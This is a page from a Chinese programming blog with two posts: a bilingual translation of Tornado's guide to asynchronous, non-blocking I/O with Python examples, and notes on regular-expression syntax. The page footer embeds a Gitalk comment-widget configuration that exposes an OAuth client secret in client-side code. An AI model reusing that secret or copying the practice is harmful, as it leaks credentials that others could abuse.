    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://noge.top/2016/08/04/1.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="nuniok">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="码力欧">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2016/08/04/1.html" class="post-title-link" itemprop="url">Asynchronous and non-Blocking I/O 翻译</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2016-08-04 00:00:00" itemprop="dateCreated datePublished" datetime="2016-08-04T00:00:00+00:00">2016-08-04</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <blockquote>
<p><a target="_blank" rel="noopener" href="http://www.tornadoweb.org/en/stable/guide/async.html">http://www.tornadoweb.org/en/stable/guide/async.html</a></p>
</blockquote>
<p>Real-time web features require a long-lived mostly-idle connection per user. In a traditional synchronous web server, this implies<br>devoting one thread to each user, which can be very expensive.<br><em>在同步状态下，实时的网络请求会一直占用着一个空的连接，这样每一个用户都会占用着一个线程，很浪费</em></p>
<p>To minimize the cost of concurrent connections, Tornado uses a single-threaded event loop. This means that all application code should aim to be asynchronous and non-blocking because only one operation can be active at a time.<br><em>为了最大限度的利用连接，Tornado使用单线程事件循环的方式。就是使应用采用异步和非阻塞的方式保持着当下只有一个活动的事件，同时又能接收多个应用请求。</em></p>
<p>The terms asynchronous and non-blocking are closely related and are often used interchangeably, but they are not quite the same thing.<br><em>异步和非阻塞这两个术语通常意思一样，但是他们也有不同的地方。</em></p>
<h2 id="Blocking"><a href="#Blocking" class="headerlink" title="Blocking"></a>Blocking</h2><p>A function blocks when it waits for something to happen before returning. A function may block for many reasons: network I&#x2F;O, disk I&#x2F;O, mutexes, etc. In fact, every function blocks, at least a little bit, while it is running and using the CPU (for an extreme example that demonstrates why CPU blocking must be taken as seriously as other kinds of blocking, consider password hashing functions like bcrypt, which by design use hundreds of milliseconds of CPU time, far more than a typical network or disk access).<br><em>等待这个功能模块返回结果前，函数有很多阻塞的原因，比如：网络I&#x2F;O、磁盘I&#x2F;O、互斥操作等。事实上每个功能模块在它运行的时候都会使用一点CPU资源（CPU阻塞必须要当做其它类型的阻塞）</em></p>
<p>A function can be blocking in some respects and non-blocking in others. For example, tornado.httpclient in the default configuration blocks on DNS resolution but not on other network access (to mitigate this use ThreadedResolver or a tornado.curl_httpclient with a properly-configured build of libcurl). In the context of Tornado we generally talk about blocking in the context of network I&#x2F;O, although all kinds of blocking are to be minimized.<br><em>函数能在一些方面阻塞，在另一些方面不阻塞，</em>*****<em>，在Tornado下我们一般讨论的是网络I&#x2F;O阻塞，其它情况都是很小的。</em><br><em>Tornado里面讨论的阻塞都是指网络阻塞，其它的阻塞可以忽略。</em></p>
<h2 id="Asynchronous"><a href="#Asynchronous" class="headerlink" title="Asynchronous"></a>Asynchronous</h2><p>An asynchronous function returns before it is finished, and generally causes some work to happen in the background before triggering some future action in the application (as opposed to normal synchronous functions, which do everything they are going to do before returning). There are many styles of asynchronous interfaces:<br><em>异步函数会在执行结束之前返回，在完成之后通常是一些后台程序去触发预先设定好的处理程序（不像同步程序，必须都做完了才返回）。下面列举了很多种风格的异步接口。</em></p>
<ul>
<li>Callback argument <em>回调参数</em></li>
<li>Return a placeholder (Future, Promise, Deferred) <em>返回一个占位符</em></li>
<li>Deliver to a queue <em>交付到队列中</em></li>
<li>Callback registry (e.g. POSIX signals) <em>回调到注册表中</em></li>
</ul>
<p>Regardless of which type of interface is used, asynchronous functions by definition interact differently with their callers; there is no free way to make a synchronous function asynchronous in a way that is transparent to its callers (systems like gevent use lightweight threads to offer performance comparable to asynchronous systems, but they do not actually make things asynchronous).<br><em>无论使用哪种接口，异步函数都会使用不同的方式与调用者交互；没有办法去定义一个同步函数却采用异步的方式调用，对于调用者来说都是透明的（就像采用gevent的轻量级线程系统去提供做到的性能堪比异步系统，但它实际上并不是异步）。</em><br><em>这句话的意思就是说同步的方法没法用异步的方式去调，虽然你写的代码看起来像是异步的，但其实并不是。</em></p>
<h2 id="Examples"><a href="#Examples" class="headerlink" title="Examples"></a>Examples</h2><p>Here is a sample synchronous function:<br><em>下面的例子是一个同步函数。</em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from tornado.httpclient import HTTPClient</span><br><span class="line"> </span><br><span class="line">def synchronous_fetch(url):</span><br><span class="line">    http_client = HTTPClient()</span><br><span class="line">    response = http_client.fetch(url)</span><br><span class="line">    return response.body</span><br></pre></td></tr></table></figure>

<p>And here is the same function rewritten to be asynchronous with a callback argument:<br><em>下面的例子被重写成异步的方式了，采用了回调参数的方式。</em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from tornado.httpclient import AsyncHTTPClient</span><br><span class="line"> </span><br><span class="line">def asynchronous_fetch(url, callback):</span><br><span class="line">    http_client = AsyncHTTPClient()</span><br><span class="line">    def handle_response(response):</span><br><span class="line">        callback(response.body)</span><br><span class="line">    http_client.fetch(url, callback=handle_response)</span><br></pre></td></tr></table></figure>

<p>And again with a Future instead of a callback:<br><em>下面的例子通过返回一个展位符的方式实现异步回调的。</em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from tornado.concurrent import Future</span><br><span class="line"> </span><br><span class="line">def async_fetch_future(url):</span><br><span class="line">    http_client = AsyncHTTPClient()</span><br><span class="line">    my_future = Future()</span><br><span class="line">    fetch_future = http_client.fetch(url)</span><br><span class="line">    fetch_future.add_done_callback(</span><br><span class="line">        lambda f: my_future.set_result(f.result()))</span><br><span class="line">    return my_future</span><br></pre></td></tr></table></figure>

<p>The raw Future version is more complex, but Futures are nonetheless recommended practice in Tornado because they have two major advantages. Error handling is more consistent since the Future.result method can simply raise an exception (as opposed to the ad-hoc error handling common in callback-oriented interfaces), and Futures lend themselves well to use with coroutines. Coroutines will be discussed in depth in the next section of this guide. Here is the coroutine version of our sample function, which is very similar to the original synchronous version:<br><em>通过<code>Future</code>的方式实现的更复杂，但是Tornado更建议这样去写，主要有两个原因。从<code>Future</code>返回的错误处理更一致，从<code>Future.result</code>方法可以返回一个简单的异常，<code>Future</code>能够更好的与协同程序一起使用。协同程序的具体讨论将会在下一节讨论，下面的例子给了一个协同程序的例子，写法很像同步的那个版本。</em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from tornado import gen</span><br><span class="line"> </span><br><span class="line">@gen.coroutine</span><br><span class="line">def fetch_coroutine(url):</span><br><span class="line">    http_client = AsyncHTTPClient()</span><br><span class="line">    response = yield http_client.fetch(url)</span><br><span class="line">    raise gen.Return(response.body)</span><br></pre></td></tr></table></figure>

<p>The statement raise gen.Return(response.body) is an artifact of Python 2, in which generators aren’t allowed to return values. To overcome this, Tornado coroutines raise a special kind of exception called a Return. The coroutine catches this exception and treats it like a returned value. In Python 3.3 and later, a return response.body achieves the same result.<br><em>这个版本中返回一个<code>raise gen.Return(response.body)</code>，在Python2中的用法，因为生成器不允许返回一个值，所以Tornado做了特殊处理，通过跑出一个<code>Return</code>的异常，然后协同程序补货这个异常，就相当于返回值了。在Python3.3以后就可以直接返回这个值了。</em></p>
<blockquote>
<p>Translated by zhangxu on 2016-08-05</p>
</blockquote>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://noge.top/2016/01/09/1.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="nuniok">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="码力欧">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2016/01/09/1.html" class="post-title-link" itemprop="url">正则表达式</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2016-01-09 00:00:00" itemprop="dateCreated datePublished" datetime="2016-01-09T00:00:00+00:00">2016-01-09</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><p>用来匹配和处理文本的字符串。基本用途是查找和替换。一种不完备的程序设计语言。</p>
<hr>
<h2 id="含义列表"><a href="#含义列表" class="headerlink" title="含义列表"></a>含义列表</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.  # 英文句号，匹配任意单个字符包括自身，相当于DOS中的 ? ，SQL中的 _ 。</span><br><span class="line">\  # 反斜杠，元字符，转义用。转义自身用 \\ 。</span><br><span class="line">[]  # 中括号，元字符，定义一个字符集合。</span><br><span class="line">-  # 连字符，字符区间用，比如0-9、A-Z。只能用在字符集合中。</span><br><span class="line">^  # 取非匹配，字符区间用。</span><br><span class="line">\d  # 任何一个数字字符。</span><br><span class="line">\D  # 任何一个非数字字符。</span><br><span class="line">\w  # 任何一个字母数字字符或下划线字符（[a-zA-Z0-9_]）</span><br><span class="line">\W  # 任何一个非字母数字或非下划线字符（[^a-zA-Z0-9_]）</span><br><span class="line">\s  # 任何一个空白字符（[\f\n\r\t\v]）</span><br><span class="line">\S # 任何一个非空白字符（[^\f\n\r\t\v]）</span><br><span class="line">+  # 匹配一个或多个字符，放在字符或字符集合后面。</span><br><span class="line">*  # 匹配零个或多个字符，放在字符或字符集合后面。</span><br><span class="line">?  # 匹配零个或一个字符，放在字符或字符集合后面。</span><br><span class="line">&#123;&#125;  # 指定匹配个数的区间或精确值。&#123;6&#125;、&#123;2,4&#125;。</span><br><span class="line"></span><br><span class="line">()  # 子表达式</span><br><span class="line">|  # 或操作符</span><br></pre></td></tr></table></figure>

<h3 id="懒惰型匹配，匹配最小子集。"><a href="#懒惰型匹配，匹配最小子集。" class="headerlink" title="懒惰型匹配，匹配最小子集。"></a>懒惰型匹配，匹配最小子集。</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">+?</span><br><span class="line">*?</span><br><span class="line">&#123;n,&#125;?</span><br></pre></td></tr></table></figure>

<h3 id="位置匹配"><a href="#位置匹配" class="headerlink" title="位置匹配"></a>位置匹配</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">\b  # 单词边界</span><br><span class="line">\B  # 不是单词边界</span><br><span class="line">^  # 字符串边界开始</span><br><span class="line">$  # 字符串边界结束</span><br><span class="line">(?m)  # 分行匹配模式， 使表达式引擎将分隔符当做一个字符串分隔符对待。</span><br></pre></td></tr></table></figure>

<h3 id="回溯引用"><a href="#回溯引用" class="headerlink" title="回溯引用"></a>回溯引用</h3><p>下面例子匹配 <code>空格 字符 空格</code><br><img src="/resource/img/zzbds/0b845d60-f9f5-4240-8f55-24f8cea04953.png" alt="原始图片"><br>下面的例子使回溯引用<br><img src="/resource/img/zzbds/a8a95f79-96ed-45db-8cb3-790a7ac6b64d.png" alt="原始图片"><br>解释回溯引用，<code>\1</code>用来获取<code>(\w+)</code>中的字符串。第一个匹配上的<code>of</code>被<code>\1</code>引用，就变成表达式<code>[ ]+(\w+)[ ]+of</code>。<br>其中<code>\1</code>代表模式里的第一个子表达式，<code>\2</code>就会代表着第二个子表达式，以此递推。</p>
<h3 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h3><p><img src="/resource/img/zzbds/32cebbb3-461b-4259-b8a3-b83d0280b752.png" alt="原始图片"></p>
<blockquote>
<p>大小写转换测试工具不支持，待测试</p>
</blockquote>
<h3 id="向前查找、向后查找"><a href="#向前查找、向后查找" class="headerlink" title="向前查找、向后查找"></a>向前查找、向后查找</h3><p>必须要放到一个字表达式中，如下例子，根据<code>:</code>来匹配，但是不消费他。<br><code>(?=)</code> 向前查找</p>
<p><img src="/resource/img/zzbds/0b28d288-452d-4d9a-a416-0e98f80d8278.png" alt="原始图片"></p>
<p><code>(?&lt;=)</code> 向后查找<br><img src="/resource/img/zzbds/acbe623c-05c5-444f-b385-169b6adedadb.png" alt="原始图片"></p>
<p><code>(?!)</code> 负向前查找<br><code>(?&lt;!)</code> 负向后查找</p>
<h3 id="嵌入条件"><a href="#嵌入条件" class="headerlink" title="嵌入条件"></a>嵌入条件</h3><p><code>(?(brackreference)true-regex)</code>其中<code>?</code>表明这是一个条件，括号里的<code>brackreference</code>是一个回溯引用，<code>true-regex</code>是一个只在<code>backreference</code>存在时才会被执行的子表达式。<br><img src="/resource/img/zzbds/352f8f35-dcac-4440-a21f-4779a26ac743.png" alt="原始图片"></p>
<hr>
<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><h3 id="不区分大小写匹配"><a href="#不区分大小写匹配" class="headerlink" title="不区分大小写匹配"></a>不区分大小写匹配</h3><p><img src="/resource/img/zzbds/00434677-3908-47ed-b192-1b337f8ea064.png" alt="原始图片"></p>
<h3 id="字符区间匹配"><a href="#字符区间匹配" class="headerlink" title="字符区间匹配"></a>字符区间匹配</h3><p><img src="/resource/img/zzbds/c44e81f9-acf5-4bb6-8f9a-e062724871bd.png" alt="原始图片"></p>
<h3 id="取非匹配"><a href="#取非匹配" class="headerlink" title="取非匹配"></a>取非匹配</h3><p><img src="/resource/img/zzbds/686133cb-f93b-4954-a17a-5aed01c0e0e8.png" alt="原始图片"></p>
<h3 id="匹配多个字符"><a href="#匹配多个字符" class="headerlink" title="匹配多个字符"></a>匹配多个字符</h3><p><img src="/resource/img/zzbds/3c36ee0a-819a-40ca-9dd5-150e0cb68beb.png" alt="原始图片"></p>
<h3 id="子表达式"><a href="#子表达式" class="headerlink" title="子表达式"></a>子表达式</h3><p><img src="/resource/img/zzbds/d5cb48c9-e648-4874-b24a-d950ffbd9868.png" alt="原始图片"></p>
<h3 id="匹配四位数的年份"><a href="#匹配四位数的年份" class="headerlink" title="匹配四位数的年份"></a>匹配四位数的年份</h3><p><img src="/resource/img/zzbds/64ddb1d1-bb13-476b-9fc4-ae4dc93e1c08.png" alt="原始图片"></p>
<h3 id="嵌入查找、向后查找组合应用"><a href="#嵌入查找、向后查找组合应用" class="headerlink" title="嵌入查找、向后查找组合应用"></a>嵌入查找、向后查找组合应用</h3><p><img src="/resource/img/zzbds/9bb21719-d586-4f77-98f7-8b0c37f16a0a.png" alt="原始图片"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/8/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><span class="page-number current">9</span><a class="page-number" href="/page/10/">10</a><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" href="/page/10/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 2015 – 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">nuniok</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  


  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdn.jsdelivr.net/npm/mermaid@8.13.4/dist/mermaid.min.js","integrity":"sha256-96rwDGMWIQYB0yKGp1sKi1yrjrLPj2oT39IpbCsIrsg="}}</script>
  <script src="/js/third-party/tags/mermaid.js"></script>



  




  

  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js","integrity":"sha256-r+3itOMtGGjap0x+10hu6jW/gZCzxHsoKrOd7gyRSGY="}}</script>
<script src="/js/third-party/math/mathjax.js"></script>


<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">

<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"nuniok","repo":"nuniok.github.io","client_id":"Ov23liWEs17fH5aYPIzS","client_secret":"6bbfa4b5a042d38b10c942b5c15f4d8a3895e982","admin_user":"nuniok","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":"zh-CN","js":{"url":"https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js","integrity":"sha256-Pmj85ojLaPOWwRtlMJwmezB/Qg8BzvJp5eTzvXaYAfA="},"path_md5":"714488baade32696a787a6623cb247eb"}</script>
<script src="/js/third-party/comments/gitalk.js"></script>

</body>
</html>
